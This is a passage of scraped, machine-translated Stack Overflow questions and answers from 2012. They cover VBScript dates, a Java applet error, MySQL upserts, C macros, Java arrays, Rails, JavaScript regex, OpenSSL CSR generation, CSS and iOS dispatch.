When you create a datetime value without a time portion in VBScript, the time is automatically assumed to be 00:00:00 (see for instance the return value of `TimeValue(Date)`). Because of this `DateDiff()` compares the "last modified" timestamp of the file with the current date at 00:00:00 and returns a value greater than 1 (or less than -1) when the difference exceeds ±24 hours.

For comparing just the date parts of two timestamps use the [`FormatDateTime()`](http://msdn.microsoft.com/en-us/library/8aebkz6s%28v=vs.84%29.aspx) function:

```
today = FormatDateTime(Date, vbShortDate)
If FormatDateTime(RFile.DateLastModified, vbShortDate) = today Then
  '...
End If 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-05T19:57:14.157

Your better off just enumarating the files with WMI manupulating the date to just compare the day month and year attributes ignoring the time stamp.

```
strComputer = "."

Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set colFiles = _
    objWMIService.ExecQuery("Select * From CIM_DataFile Where Drive = 'E:' and Path = '\\Test\\'")

For Each objFile in colFiles
    dtCreationDate = WMIDateStringToDate(objFile.CreationDate)
    If Day(Now)&Month(Now)&Year(Now) = Day(dtCreationDate)&Month(dtCreationDate)&Year(dtCreationDate) Then
      WScript.Echo objFile.Name
    End If
Next

Function WMIDateStringToDate(sCreatoionDate)
    WMIDateStringToDate = CDate(Mid(sCreatoionDate, 7, 2) & "/" & _
    Mid(sCreatoionDate, 5, 2) & "/" & Left(sCreatoionDate, 4) _
    & " " & Mid (sCreatoionDate, 9, 2) & ":" & _
    Mid(sCreatoionDate, 11, 2) & ":" & Mid(sCreatoionDate, 13, 2))
End Function 
```

# visual-studio-2010 - 使用 Visual Studio 2010 或 2012 哪个更舒服？

> ID：13221506
> 
> 赞同：0
> 
> 时间：2012-11-04T18:26:51.410
> 
> 标签：visual-studio-2010, visual-studio, visual-studio-2012

我一直在使用 VS 2010 一段时间。请告诉我 2012 年是否有一些新选项，使其使用起来更舒适。喜欢 Eclipse 中的代码格式化或更好地解决问题？VS 2012会打开VS2010项目吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:31:18.303

VS2012 从 VS2010 打开项目，但仅限于这个方向。如果您在 VS2012 中构建解决方案，您将无法再在 VS2010 中打开它。

# java - Java/HTML - 抛出 InvocationTargetException

> ID：13221509
> 
> 赞同：2
> 
> 时间：2012-11-04T18:27:30.970
> 
> 标签：java, html, applet, java-web-start, invocationtargetexception

我正在编写一个状态检查器，它是一个 java web-start 小程序。我可以在我的计算机上运行它，但是它会运行得很好；当我在网页上运行它时，出现运行时错误 java.lang.reflect.InvocationTargetException。这是我用来运行 jar 文件的 html 文件

```
<html>
    <head>
        <applet code="StatusCheckerMain" width=380 height=172 archive="Launch.jar">
            <param name="servername"
                    value="Evolution-X"/>
            <param name="ip"
                    value="127.0.0.1"/>
            <param name="port"
                    value="43594"/>
            Java is not installed on your machine or your browser does not allow Java Web-Start Applets to run.<br /><br />Get the latest Java technology at <a href="http://www.java.com/">http://www.Java.com/</a>
        </applet>
    </head>
</html> 
```

这是我的源文件

```
import java.awt.*;
import java.io.*;
import java.net.*;
import javax.swing.*;
/**
 *
 * @author Dan
 */
public class GUIChecker extends JApplet {

    public GUIChecker() { }

    public void init() {
        try {
            java.awt.EventQueue.invokeAndWait(new Runnable() {
                public void run() {
                    initComponents();
                }
            });
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    private String getServerName() {
        if (isActive()) {
            return (getParameter("servername"));
        } else {
            return "Default";
        }
    }
    private String getIP() {
        if (isActive()) {
            return (getParameter("ip"));
        } else {
            return "localhost";
        }
    }
    private int getPort() {
        if (isActive()) {
            return (Integer.parseInt(getParameter("port")));
        } else {
            return 43594;
        }
    }   
    private boolean checkOnline(String ip, int port) throws UnknownHostException, IOException {
        try {
            Socket sock = new Socket(ip, port);
            return sock.isConnected();
        } catch (ConnectException e) {
            return false;
        }
    }
    private String getConnection(String ip, int port) throws UnknownHostException, IOException {
        try {
            Socket sock = new Socket(ip, port);
            return (sock.isConnected() ? "ONLINE" : "OFFLINE");
        } catch (ConnectException e) {
            return ("OFFLINE");
        }
   }
    @SuppressWarnings("unchecked")
    private void initComponents() {

        jScrollPane1 = new JScrollPane();
        jTextArea1 = new JTextArea();
        setVisible(true);
        jTextArea1.setEditable(false);
        jTextArea1.setColumns(20);
        jTextArea1.setRows(5);
        try {
            Font font = new Font("Verdana", Font.BOLD, 12);
            if (checkOnline(getIP(), getPort())) {
                jTextArea1.setForeground(Color.GREEN);
            } else {
                jTextArea1.setForeground(Color.RED);
            }
            jTextArea1.setFont(font);
            jTextArea1.setText(getServerName()+" IP: "+getIP()+" on port: "+getPort()+" is currently: "+getConnection(getIP(), getPort()));
        } catch (IOException e) {
            e.printStackTrace();
        }

        GroupLayout layout = new GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane1, GroupLayout.DEFAULT_SIZE, 385, Short.MAX_VALUE)
                .addContainerGap())
            .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                .addGroup(layout.createSequentialGroup()
                    .addGap(0, 11, Short.MAX_VALUE)
                    .addComponent(jTextArea1, GroupLayout.PREFERRED_SIZE, 383, GroupLayout.PREFERRED_SIZE)
                    .addGap(0, 11, Short.MAX_VALUE)))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane1, GroupLayout.DEFAULT_SIZE, 121, Short.MAX_VALUE)
                .addContainerGap())
            .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                .addGroup(layout.createSequentialGroup()
                    .addGap(0, 12, Short.MAX_VALUE)
                    .addComponent(jTextArea1, GroupLayout.PREFERRED_SIZE, 119, GroupLayout.PREFERRED_SIZE)
                    .addGap(0, 12, Short.MAX_VALUE)))
        );
        validate();
    }
    private JScrollPane jScrollPane1;
    private JTextArea jTextArea1;
} 
```

![在此处输入图像描述](../Images/15973a8b870dd79400a4c4b616e7e6a1.png) 在我的桌面上运行它时没有错误，但是当我在我的网页上运行它时，这就是我所得到的。

```
Clear classloader cache ... completed.
Trace level set to 5: all ... completed.basic: Added progress listener: sun.plugin.util.ProgressMonitorAdapter@844c3d
basic: Plugin2ClassLoader.addURL parent called for file:/C:/Users/Dan/Desktop/Evolution-X/Evolution-X%20639/Evolution-X%20%20639%20Server/Evolution-X%20639%20Server/Evolution-X%20639%20Server/SocketsTest/TestConnection/bin/
network: Cache entry not found [url: file:/C:/Users/Dan/Desktop/Evolution-X/Evolution-X%20639/Evolution-X%20%20639%20Server/Evolution-X%20639%20Server/Evolution-X%20639%20Server/SocketsTest/TestConnection/bin/, version: null]
network: Cache entry not found [url: file:/C:/Users/Dan/Desktop/Evolution-X/Evolution-X%20639/Evolution-X%20%20639%20Server/Evolution-X%20639%20Server/Evolution-X%20639%20Server/SocketsTest/TestConnection/bin/, version: null]
basic: exception: java.lang.reflect.InvocationTargetException.
java.lang.RuntimeException: java.lang.reflect.InvocationTargetException
    at com.sun.deploy.uitoolkit.impl.awt.AWTAppletAdapter.runOnEDTAndWait(Unknown Source)
    at com.sun.deploy.uitoolkit.impl.awt.AWTAppletAdapter.instantiateApplet(Unknown Source)
    at sun.plugin2.applet.Plugin2Manager.initAppletAdapter(Unknown Source)
    at sun.plugin2.applet.Plugin2Manager$AppletExecutionRunnable.run(Unknown Source)
    at java.lang.Thread.run(Unknown Source)
Caused by: java.lang.reflect.InvocationTargetException
    at com.sun.deploy.uitoolkit.impl.awt.OldPluginAWTUtil.invokeAndWait(Unknown Source)
    ... 5 more
Caused by: java.lang.ClassCastException: StatusCheckerMain cannot be cast to java.applet.Applet
    at com.sun.deploy.uitoolkit.impl.awt.AWTAppletAdapter$1.run(Unknown Source)
    at java.awt.event.InvocationEvent.dispatch(Unknown Source)
    at java.awt.EventQueue.dispatchEventImpl(Unknown Source)
    at java.awt.EventQueue.access$200(Unknown Source)
    at java.awt.EventQueue$3.run(Unknown Source)
    at java.awt.EventQueue$3.run(Unknown Source)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.security.ProtectionDomain$1.doIntersectionPrivilege(Unknown Source)
    at java.awt.EventQueue.dispatchEvent(Unknown Source)
    at java.awt.EventDispatchThread.pumpOneEventForFilters(Unknown Source)
    at java.awt.EventDispatchThread.pumpEventsForFilter(Unknown Source)
    at java.awt.EventDispatchThread.pumpEventsForHierarchy(Unknown Source)
    at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
    at java.awt.EventDispatchThread.pumpEvents(Unknown Source)
    at java.awt.EventDispatchThread.run(Unknown Source)
basic: Removed progress listener: sun.plugin.util.ProgressMonitorAdapter@844c3d
security: Reset deny session certificate store
basic: Dialog type is not candidate for embedding 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-05T00:29:06.167

applet 元素用于加载 and 类型的类`JApplet`，`Applet`而代码是`JFrame`.

所以从这样的事情开始。

```
import javax.swing.*;

/*
<applet code=DialerApplet width=250 height=70>
<param name="servername" value="Evolution-X" >
<param name="ip"  value="127.0.0.1" >
<param name="port" value="43594" >
</applet>
*/
public class DialerApplet extends JApplet {
    public void init() {
        JTextArea ta = new JTextArea(20,5);
        add(new JScrollPane(ta));

        String eol = System.getProperty("line.separator");
        StringBuilder sb = new StringBuilder();
        String[] params = {"servername","ip","port"};
        for (String param : params) {
            sb.append( param );
            sb.append( ": " );
            sb.append( getParameter(param) );
            sb.append( eol );
        }
        ta.setText(sb.toString());

        validate();
    }
} 
```

![工作小程序](../Images/25ab5c89dc96739ff7d3d79f85fa2359.png)

## 更新

堆栈跟踪中的重要行是：

```
Caused by: java.lang.ClassCastException: 
    StatusCheckerMain cannot be cast to java.applet.Applet 
```

这很奇怪。

*   根据问题的代码扩展了小程序。
*   控制台输出支持缓存已刷新（删除可能已存储的旧类）。
*   A`JApplet` **扩展** `Applet`- 所以它**可以**被投射。

确保将新 Jar 复制到运行代码的任何位置。还可以尝试启动一个新项目，看看您是否可以获得***我***发布的代码以在您的机器上作为小程序启动。如果不是，则表明存在更根本的问题。

# php - 如何在 MySQL 中添加记录而不导致重复？

> ID：13221518
> 
> 赞同：0
> 
> 时间：2012-11-04T18:27:59.897
> 
> 标签：php, mysql

我正在使用 MySQL 和 PHP。在 MySQL 中，您如何使用附加记录对现有表进行更新，而不会导致重复？记录是客户，每条记录的关键是客户帐号，例如“1234”。

我基本上需要做三件事。如果客户帐户不存在，则添加新客户记录，更新现有客户的电话号码或电子邮件地址等信息，如果他们不再是客户，则删除客户记录。

数据每天都以提要的形式出现，营销部门希望拥有自己的客户数据库，并添加自己的字段，这就是为什么我不简单地从每日提要重新创建数据库的原因。目标是使其与提要保持同步。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:32:33.993

我建议您使用 PHP 进行所有处理。

当您遍历客户记录时，首先检查记录是否存在：

```
$query = "SELECT customer_account_number FROM table WHERE customer_account_number = 1234";
$result= $mysql -> query($query);
$num   = $result -> num_rows;

if($num == 1){
   // The record already exists so you update.
   $update_query = "UPDATE table SET some_field = 'Some Value' WHERE customer_account_number = 1234";
   $update_result= $mysqli -> query($update_query);
}else{
   // The record doesn't exist so create a record.
   $insert_query = "INSERT INTO table (customer_account_number) VALUES (1234)";
   $insert_result= $mysqli -> query($insert_query);
} 
```

或者，您可以执行一个选择查询来获取客户帐号并将它们弹出到一个数组中。

```
$query = "SELECT customer_account_number FROM table";
$result= $mysql -> query($query);
$num   = $result -> num_rows;

while($row = $result -> fetch_array(MYSQLI_ASSOC)){

   $cust_records[] = $row['customer_account_number'];

}

// Then for each customer record your looping through.

if(in_array($customer_record_id, $cust_records)){
    // It exists - so just update
    $update_query = "UPDATE table SET some_field = 'Some Value' WHERE customer_account_number = 1234";
    $update_result= $mysqli -> query($update_query);
}else{
    // Doesn't exist - insert
    $insert_query = "INSERT INTO table (customer_account_number) VALUES (1234)";
    $insert_result= $mysqli -> query($insert_query);
} 
```

此外，正如 Tadman 所建议的，如果您确保客户帐号是唯一列，那么这将增加额外的保护以确保无法添加重复项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:33:44.333

在插入之前运行 a`SELECT id FROM table`并将 ID 作为键保存在关联数组中。如果设置了键，则只需检查该 id 是否存在于数据库中并基于此进行处理。

如果您删除每个客户流程，最终您将留下一系列不再存在的客户。

执行一次可以节省一些 SQL 负载。

```
$result = mysql_query('SELECT id FROM table');
$ids = array();
while($row = mysql_fetch_assoc($result)){
    $ids[$row['id']] = true;
}

foreach($objects as $key => $obj) {
  if($ids[$obj['id']]) {
    // exists, update!
    unset($ids[$obj['id']]);
  } else {
    // new, insert!
  }
}

// go through the remaining people not added
for($ids as $deleted_id) {
  // delete this guy
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T18:36:14.233

在重复更新查询上使用插入。它执行您问题的插入和更新部分。对于删除，我想你可以有另一个查询。参考：[http ://dev.mysql.com/doc/refman/5.0/en/insert-on-duplicate.html](http://dev.mysql.com/doc/refman/5.0/en/insert-on-duplicate.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-04T18:37:46.583

MySQL 支持“on duplicate key update”语法。
这基本上允许您在一个 SQL 语句中指定如果主键（您的帐号）已经存在，则更新哪些字段。

[mysql语法](http://dev.mysql.com/doc/refman/5.0/en/insert-on-duplicate.html)

您必须使用单独的 SQL 语句来处理删除，因为该逻辑几乎肯定来自您的客户提要。

# c - 使用宏构造函数

> ID：13221523
> 
> 赞同：0
> 
> 时间：2012-11-04T18:28:27.167
> 
> 标签：c, macros, c-preprocessor

> **可能重复：**
> [用于在 C 中连接两个字符串的宏](https://stackoverflow.com/questions/2191316/macro-for-concatenating-two-strings-in-c)

我有一个看起来像这样的函数：

```
bool module_foo_process(void* bar) { return doMagic(bar); } 
```

现在，我想用一个宏来生成它。例如，上述函数的宏如下所示：

```
MY_AMAZING_MACRO(foo) 
```

这使我可以编写如下内容：

```
MY_AMAZING_MACRO(awesome) 
```

得到这个：

```
bool module_awesome_process(void* bar) { return doMagic(bar); } 
```

关于如何在 C 中实现这一点的任何想法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T18:35:13.893

```
#define MY_AMAZING_MACRO(name) \
  bool module_##name##_process(void* bar) { return doMagic(bar); } 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-04T18:35:36.137

使用连接运算符`##`：

```
#define MY_AMAZING_MACRO(foo) bool module_##foo##_process(void* bar) { return doMagic(bar); } 
```

有关更多详细信息，请参阅 gcc 在线文档：[串联](http://gcc.gnu.org/onlinedocs/cpp/Concatenation.html)。

# java - 在Java中合并两个多维字符串数组

> ID：13221537
> 
> 赞同：1
> 
> 时间：2012-11-04T18:30:23.887
> 
> 标签：java, arrays, string, multidimensional-array

我有（至少）两个多维字符串数组（尺寸不相等），我试图并排放置。那是，

`String[][] arrayOne`包含以下内容：

```
aaaaa
aaaaa
aaaaa
aaaaa
aaaaa
aaaaa
aaaaa 
```

...并`String[][] arrayTwo`包含以下内容：

```
bbbbbbbb
bbbbbbbb
bbbbbbbb
bbbbbbbb 
```

...并`String[][] arrayThree`包含以下内容：

```
ccccccc
ccccccc
ccccccc
ccccccc
ccccccc
ccccccc
ccccccc
ccccccc 
```

我一直未能成功地尝试创建一个返回以下内容的方法（最好作为多维字符串数组，但也可以作为字符串工作）：

`String[][] result`包含以下内容：

```
 ccccccc
               ccccccc
aaaaa          ccccccc
aaaaa          ccccccc
aaaaa          ccccccc
aaaaa bbbbbbbb ccccccc
aaaaa bbbbbbbb ccccccc
aaaaa bbbbbbbb ccccccc
aaaaa bbbbbbbb ccccccc 
```

所以基本上，该方法会将数组并排放置，将它们全部对齐到底部，然后将它们组合成一个数组。

到目前为止，我解决这个问题的复杂尝试只会产生更多错误，而尝试使用 println 语句等进行调试只会让我更加困惑。而且我认为有人知道一种相当简单的方法来完成这项任务。

如果有人知道，您的帮助将不胜感激！！！

**编辑 - **示例 #2：

```
aaaa            bbb            ccccc                       ccccc
aaaa   'plus'   bbb   'plus'   ccccc   'yields'   aaaa     ccccc
aaaa                           ccccc              aaaa bbb ccccc
                               ccccc              aaaa bbb ccccc 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:54:19.980

您的问题的（未经测试的）通用解决方案：

**编辑：** *感谢@Paul Bellora 的测试和确认。*

```
public static <T> T[][] mergeArrays(Class<T> clazz, T[][]... arrays) {
    // determine length of 1st dimension.
    int dim1 = 0;
    for (T[][] arr : arrays) {
        dim1 += arr.length;
    }
    // Create new 2Dim Array
    T[][] result = (T[][]) Array.newInstance(clazz, dim1, 0);
    // Fill the new array with all 'old' arrays
    int index = 0;
    for (T[][] arr : arrays) {
        for (T[] array : arr) {
            // changes within your old arrays will reflect to merged one
            result[index++] = array;
        }
    }
    return result;
} 
```

这就是你所说的：

```
 String[][] one = // your 1st array here;
    String[][] two = // your 2nd array here;
    String[][] three = // your 3rd array here;
    String[][] four = // your 4th array here;
    // This works with an arbitrary amount of arrays.
    String[][] merged1 = mergeArrays(String.class, one, two, three);
    String[][] merged2 = mergeArrays(String.class, one, two, three, four); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:59:49.760

根据要求，只是一个`String`版本，仍未测试：

```
public static String[][] mergeStringArrays(String[][]... arrays) {
    // determine length of 1st dimension.
    int dim1 = 0;
    for (String[][] arr : arrays) {
        dim1 += arr.length;
    }
    // Create new 2Dim Array
    String [][] result = new String[dim1][];
    // Fill the new array with all 'old' arrays
    int index = 0;
    for (String[][] arr : arrays) {
        for (String[] array : arr) {
            // changes within your old arrays will reflect to merged one
            result[index++] = array;
        }
    }
    return result;
} 
```

查看我的第一个答案，了解如何调用此方法。

# ruby-on-rails - 如何禁用本地开发的数据库连接？

> ID：13221541
> 
> 赞同：0
> 
> 时间：2012-11-04T18:30:28.820
> 
> 标签：ruby-on-rails, database, activerecord

我目前正在本地机器上开发我的 Rails 应用程序。我的本地机器上没有安装数据库，我将代码发送到远程测试服务器，该服务器实际上在开发模式下运行应用程序。

直到昨天，我本地机器上的所有命令（如`rails g model foo`或）都`rails g controller foo`可以正常工作。

但是现在`rails generate`由于没有数据库连接，所有命令都开始失败。我认为直接原因是因为我对我的应用程序配置进行了一些更改，但我不确定更改在哪里。

我猜错误的部分是`rails generate`命令总是在调用`active_record` 它总是验证数据库连接。

* * *

现在，我的问题是：

有什么方法可以暂时禁用`rails`验证数据库连接，用于本地开发（没有可用的数据库连接）？

我尝试删除`config/database.yml`，但没有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:34:04.443

您的本地开发环境需要具有与应用程序所需的相同类型的设施。如果您有数据库支持的模型，那么您需要一个数据库，最好与部署应用程序时使用的数据库相同，这样您的测试才有用。

为本地开发建立数据库确实应该没什么大不了的。根据您的平台，通常有许多不同的易于使用的安装程序可用。

将您的代码更改上传到远程服务器以执行是一种非常不正常的开发模型。如果您别无选择，最好在远程系统上创建模型并将它们拉下来进行编辑。

# xcode - 标签未在运行时显示在故事板中的同一位置

> ID：13221543
> 
> 赞同：0
> 
> 时间：2012-11-04T18:30:49.800
> 
> 标签：xcode, uiimageview, storyboard, label

我为背景创建了一个 PNG 并与图像视图一起使用。该图像有一个句子：'Relação Risco/Ganho:'，然后是通过标签显示的结果。标签与图像中的文本位于同一基线。

当我运行该应用程序时，它昨天运行良好，但今天突然标签没有出现在故事​​板中的相同位置。

下面是截图。

![故事板文件中的图像](../Images/cc7a38d1e7057a0fff96abe1d90ad10e.png)

![来自 iPad 模拟器的图像](../Images/3ad6b969715f2ad73d337802e0e8c802.png)

所以有人知道是什么原因造成的吗？

谢谢！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:47:26.770

确保您的自动调整大小选项设置正确。

![在此处输入图像描述](../Images/724d5f0fd968c9acc68591ba867da6ac.png)

# javascript - 如何在不替换标签本身的情况下替换html标签之间的内容

> ID：13221544
> 
> 赞同：2
> 
> 时间：2012-11-04T18:30:51.380
> 
> 标签：javascript, html, regex

假设我有一个这样的字符串：

```
<code>Blah blah Blah
enter code here</code>
<code class="lol">enter code here
fghfgh</code> 
```

我想使用 javascript 将`<code>`标签之间的所有出现替换为 html 编码的回调函数。

**这是我目前拥有的：**

```
function code_parsing(data){
    //Dont escape & because we need that... in case we deliberately write them in
    var escape_html = function(data, p1, p2, p3, p4) {
        return p1.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
    };

    data = data.replace(/<code[^>]*>([\s\S]*?)<\/code>/gm, escape_html);
        // \[start\](.*?)\[end\]
        return data;        
    }; 
```

不幸的是，此功能正在删除`"<code>"`标签并仅用内容替换它们。我想保留`<code>`带有任意数量属性的标签。如果我只是将`<code>`标签硬编码回其中，我将丢失属性。

我知道正则表达式不是最好的工具，**但其中不会有任何嵌套元素。**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T18:35:08.333

您不应该使用正则表达式来解析 HTML。

也就是说，您需要使用括号组捕获要保留的内容，并让您的替换器将其附加到您操作的位上。

```
data.replace(/(<code[^>]*>)([\s\S]*?)(<\/code>)/g,
             function (_, startTag, body, endTag) {
               return startTag + escapeHtml(body) + endTag;
             }) 
```

要了解为什么不应该使用正则表达式来解析 HTML，请考虑这对

```
<code title="Shows how to tell whether x > y">if (x &gt; y) { ... }</code>

<code lang="js">node.style.color = "<code lang="css">#ff0000</code>"</code>

<code>foo</CODE >

<textarea><code>My HTML code goes here</code></textarea>

<code>foo  <!-- commented out </code> --></code> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:35:45.310

简单的解决方案：在您的`escape_html`函数中，在对字符串完成操作之后，但在返回之前，将标签附加并添加到字符串并返回完整内容。

有时最简单的答案是最好的:)

# javascript - 如何在 javascript RegExp 中获取所有括号捕获

> ID：13221553
> 
> 赞同：0
> 
> 时间：2012-11-04T18:33:02.973
> 
> 标签：javascript, regex

如果我做：

```
"A first sentence. A second sentence".match(/A\s([^\s]*)\ssentence/g) 
```

这返回：

```
["A first sentence", "A second sentence"] 
```

如果我使用：

```
RegExp.$1 
```

然后我只是得到最后一个第一个括号捕获，所以`"second"`.

我想得到数组`["first","second"]`。是否可以？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T18:38:33.950

您需要循环运行它并构建集合。

```
var str = "A first sentence. A second sentence",
    regex = /A\s([^\s]*)\ssentence/g,
    result = [],
    match;

while (match = regex.exec(str)) {
    result.push(match[1]);
}

console.log(result); 
```

因为正则表达式是`g`全局的，它会记住最后一次匹配的位置，并在下次使用正则表达式时从那里开始。因此循环将继续，直到找不到更多匹配项。

在循环内部，我们只需将子组添加到`result`数组中。

* * *

有些人喜欢`.replace`为此目的使用。

```
var str = "A first sentence. A second sentence",
    regex = /A\s([^\s]*)\ssentence/g,
    result = [];

str.replace(regex, function(str, g1) {
    result.push(g1);
});

console.log(result); 
```

我们实际上并没有进行字符串替换，而只是利用了它重复搜索直到找不到更多匹配项的事实。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:39:13.477

您必须在没有修饰符的情况下重新运行正则表达式`g`才能获得子模式。就像是：

```
"A first sentence. A second sentence".match(/A\s([^\s]*)\ssentence/g)
    .map(function(a) {return a.match(/A\s([^\s]*)\ssentence/);}) 
```

（假设`Array.prototype.map`存在或填充 - 否则使用循环）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T19:01:05.547

为简单起见，定义

```
function runRegex(str, pat, ret){ 
  return str.match(pat).map(function(a){ 
    a.match(pat); var b; eval("with(RegExp) b = " + ret + ";"); return b;
  });
} 
```

并将其与所需参数一起使用

```
runRegex("A first sentence. A second sentence", /A\s([^\s]*)\ssentence/g, "$1"); 
```

检查[**这个演示**](http://jsfiddle.net/PbvnC/)。

* * *

这个解决方案的美妙之处在于您可以使用复杂的返回公式，例如

```
runRegex("A first sentence. A second sentence", /A\s([^\s]*)(\ssentence)/g, "$1+$2")); 
```

# apache - 如何生成适用于 Nginx 和 Apache 的 SSL 的 CSR？

> ID：13221554
> 
> 赞同：5
> 
> 时间：2012-11-04T18:33:04.370
> 
> 标签：apache, ssl, https, nginx, openssl

我想生成用于请求 SSL（通配符）证书的 CSR 文件。此证书和私钥将在多台机器上使用 Apache 和 Nginx。

RapitSSL 为不同的设置声明了以下命令：

*   **Nginx**

    `$ openssl req -new -newkey rsa:2048 -nodes -keyout server.key -out server.csr`

*   **阿帕奇国防部 SSL**

    `$ openssl genrsa -des3 -out <private key file name>.key 2048`

*   **Apache-SSL**

    `$ openssl genrsa -des3 -out www.yourdomain-example.com.key 2048`

有没有办法生成适用于 Apache 和 Nginx 的 CSR？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-04T18:45:02.070

> *   阿帕奇国防部 SSL
>     
>     
>     
>     $ openssl genrsa -des3 -out <私钥文件名>.key 2048
>     
>     
> *   Apache-SSL
>     
>     
>     
>     $ openssl genrsa -des3 -out www.yourdomain-example.com.key 2048

这两个显然是完全相同的命令，只是示例名称的写法不同。他们只是生成密钥对，您还需要一个额外的`req`命令来生成 CSR。

`genrsa`生成密钥对，并`req`生成 CSR。但是，`req`使用时可以同时执行这两个操作`-newkey`。

请参阅[OpenSSL`req`示例文档](http://www.openssl.org/docs/apps/req.html#EXAMPLES)：

> 创建一个私钥，然后从中生成一个证书请求：
> 
> ```
> openssl genrsa -out key.pem 1024    
> openssl req -new -key key.pem -out req.pem 
> ```
> 
> 相同但仅使用 req：
> 
> ```
> openssl req -newkey rsa:1024 -keyout key.pem -out req.pem 
> ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-04T23:18:24.120

> 如何生成适用于 Nginx 和 Apache 的 SSL
> 的 CSR ... 有没有办法生成适用于 Apache 和 Nginx 的 CSR？

快速回答问题以澄清事情...... Nginx 和 Apache 不使用 CSR。他们使用证书和私钥。

也许您是想说关于自签名证书的事情？如果是这样，请将`-x509`选项添加到`openssl req`命令中。这会创建自签名证书而不是签名请求。

There's a lot more to self-signed certificates (and server certificates in general). See, for example, [How to create a self-signed certificate with openssl?](https://stackoverflow.com/questions/10175812/how-to-create-a-self-signed-certificate-with-openssl/27931596#27931596)

# css - 处理跨多个页面使用的 Div 容器内的样式

> ID：13221555
> 
> 赞同：0
> 
> 时间：2012-11-04T18:33:13.013
> 
> 标签：css, html, styles

我试图通过搜索来找到答案，但结果是空的。基本上我不确定如何正确处理一些 CSS 设计。我有一个用于许多页面的模板。我需要设计几个容器。例如，我有一个名为“box 1”的 div，我在许多不同的页面上使用它。我已经用 css 在外部设置了文本框的长度。我现在如何使用“box 1”div 在不同页面中设置文本框的样式，而不会覆盖我的原始样式。有没有办法给这些贴上标签。这可能吗？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:38:50.390

您可以应用多个类：

```
.box {
    background-color: red;
}

.box.new_style {
    font-weight: bold;
} 
```

如果你创建一个 div：

```
<div class="box">This is a box</div> 
```

它将有一个红色背景，然后是另一个 div：

```
<div class="box new_style">This is a box</div> 
```

它将具有红色背景和粗体文本。

* * *

由于您提到了多个页面，您可以将一个类附加到容器或`body`，然后使用：

```
<body class="some_page">
    <div class="box">
       .... 
```

然后：

```
.some_page .box { font-weight: bold; } 
```

# ios - 调度中的内存管理

> ID：13221556
> 
> 赞同：0
> 
> 时间：2012-11-04T18:33:23.793
> 
> 标签：ios, memory-management, dispatch

我尝试使用以下代码在我的 iPad 应用程序上制作后台所有视图的拇指：

```
NSString *path = [self.page previewPathForOrientation:currentOrientation];
dispatch_async( dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
  @autoreleasepool {
    UIGraphicsBeginImageContextWithOptions(self.previewView.bounds.size, NO, 0.0);
    [self.previewView.layer renderInContext:UIGraphicsGetCurrentContext()];
    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();

    self.previewView = nil;
    float scale = [UIScreen mainScreen].scale;
    CGRect previewRect = currentOrientation == Landscape ? [[OrientationLandscape singleton] frameForPreviewImage] : [[OrientationPortrait singleton] frameForPreviewImage];
    CGSize previewSize = CGSizeMake(previewRect.size.width * scale, previewRect.size.height * scale);
    UIImage *scaledImage = [image scaleImageToSize:previewSize];

    CGImageDestinationRef imageDestination = CGImageDestinationCreateWithURL((__bridge CFURLRef)[[NSURL alloc] initFileURLWithPath:path], (__bridge CFStringRef)@"public.png", 1, NULL);
    CGImageDestinationAddImage(imageDestination, [scaledImage CGImage], NULL);
    CGImageDestinationFinalize(imageDestination);
    CFRelease(imageDestination);

    NSFileManager *fileMngr = [[NSFileManager alloc] init];
    if(![fileMngr fileExistsAtPath:path])
    {
      ZAssert(0, @"could not save preview file");
    }
    dispatch_async(dispatch_get_main_queue(), ^{
      rendered++;
      //DLog(@"rendered %d items", rendered);
      [GetController addSkipBackupAttributeToItemAtPath:path];
      [self.page setPreviewRenderedForOrientation:currentOrientation];
      contentsCount = 0;
      currentContentIndex = 0;
      //[self prepareOtherOrientation];
      if(self.journal == nil && (![self.page previewRenderedForOrientation:Landscape] || ![self.page previewRenderedForOrientation:Portrait])){
        [self appendPage:self.page];
      }
      DLog(@"rendered page %@ in orientation %d", self.page, currentOrientation);
      self.page = nil;
      [self retry];
    });
  }
}); 
```

